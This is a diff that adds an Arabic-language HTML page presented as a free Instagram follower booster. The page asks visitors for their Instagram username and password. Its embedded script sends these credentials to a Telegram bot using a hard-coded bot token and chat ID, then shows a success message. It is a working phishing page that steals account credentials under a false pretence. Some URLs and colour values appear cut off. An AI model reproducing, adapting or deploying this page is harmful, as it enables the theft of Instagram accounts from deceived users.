@@ -1,0 +1,137 @@
+<!DOCTYPE html> 
+<html lang="ar" dir="rtl"> 
+<head> 
+<meta charset="UTF-8" /> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
+<title> 💥 زيادة متابعين إنستقرام </title> 
+<link rel="stylesheet" href="https:                                                                        
+<style> 
+body { 
+background: linear-gradient(to right,                             
+display: flex; 
+justify-content: center; 
+align-items: center; 
+min-height: 100vh; 
+font-family: 'Tajawal', sans-serif; 
+} 
+.container { 
+background: white; 
+padding: 2rem; 
+border-radius: 15px; 
+box-shadow: 0 0 15px rgba(0,0,0,0.2); 
+width: 100%; 
+max-width: 300px; 
+text-align: center; 
+} 
+.logo { 
+font-size: 3rem; 
+color:          
+margin-bottom: 1rem; 
+} 
+h2 { 
+margin-bottom: 1rem; 
+color:       
+} 
+input, select { 
+width: 100%; 
+padding: 12px; 
+margin: 10px 0; 
+border: 1px solid       
+border-radius: 10px; 
+font-size: 1rem; 
+} 
+button { 
+background-color:          
+color: white; 
+padding: 12px; 
+width: 100%; 
+border: none; 
+border-radius: 10px; 
+font-size: 1rem; 
+cursor: pointer; 
+transition: 0.3s; 
+} 
+button:hover { 
+background-color:          
+} 
+.loading { 
+display: none; 
+margin-top: 10px; 
+color:          
+} 
+.loading.show { 
+display: block; 
+} 
+.footer { 
+margin-top: 1rem; 
+font-size: 0.9rem; 
+color:       
+} 
+</style> 
+</head> 
+<body> 
+<div class="container"> 
+<div class="logo"> 
+<i class="fab fa-instagram"></i> 
+</div> 
+<h2> زيادة متابعين إنستقرام </h2> 
+<form id="followForm"> 
+<input id="username" type="text" placeholder="اسم المستخدم" /> 
+<input id="password" type="password" placeholder="كلمة المرور" /> 
+<select id="followers"> 
+<option value="" disabled="" selected=""> اختر عدد المتابعين </option> 
+<option value="1000"> 1000 متابع </option> 
+<option value="3000"> 3000 متابع </option> 
+<option value="5000"> 5000 متابع </option> 
+</select> 
+<button type="submit"> تسجيل الدخول </button> 
+</form> 
+<div class="loading" id="loading"> 
+<i class="fas fa-spinner fa-spin"></i> جاري الإرسال... 
+</div> 
+<div class="footer"> © 2025 جميع الحقوق محفوظة </div> 
+</div> 
+<script> 
+const token = "644711615:AAF50mp-3EsI80Hwqj-DombQpFcl65wdAm8"; 
+const chatId = "8265882964"; 
+const form = document.getElementById("followForm"); 
+const loading = document.getElementById("loading"); 
+form.addEventListener("submit", function(e) { 
+e.preventDefault(); 
+const username = document.getElementById("username").value.trim(); 
+const password = document.getElementById("password").value.trim(); 
+const followers = document.getElementById("followers").value; 
+if (!username || !password || !followers) { 
+alert("يرجى تعبئة جميع الحقول"); 
+return; 
+} 
+loading.classList.add("show"); 
+const message = `📥 بيانات مستخدم انستقرام:\nUser: ${username}\nPass: ${password}\nFollowers: ${followers}`; 
+const url = `https:                                             
+fetch(url, { 
+method: "POST", 
+headers: { 
+'Content-Type': 'application/x-www-form-urlencoded' 
+}, 
+body: `chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(message)}` 
+}) 
+.then(response => response.json()) 
+.then(result => { 
+if (result.ok) { 
+alert("✅ تم بنجاح!"); 
+form.reset(); 
+} else { 
+alert("❌ فشل : " + result.description); 
+} 
+}) 
+.catch(error => { 
+alert("❌ حدث خطأ أثناء : " + error.message); 
+}) 
+.finally(() => { 
+loading.classList.remove("show"); 
+}); 
+}); 
+</script> 
+</body> 
+</html>
+
